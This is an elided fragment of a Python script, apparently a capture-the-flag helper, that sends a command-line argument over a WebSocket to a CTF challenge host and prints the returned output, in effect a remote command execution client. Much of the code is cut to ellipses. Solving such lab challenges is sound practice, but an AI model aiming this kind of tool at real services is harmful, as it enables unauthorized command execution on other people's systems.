...
URL = 'ws://oj-10-30-15-3-38081.adworld.xctf.org.cn/ws'
ORIGIN = 'http://oj-10-30-15-3-38081.adworld.xctf.org.cn'
...
def main():
    if len(sys.argv) < 2:
        print('usage: python3.11 web_service_exec.py <command>')
        return
    cmd = ' '.join(sys.argv[1:])
    ...
    ws.send('0' + full)
    out = recv_until_contains(ws, marker, 30)
    print(out)
    ws.close()
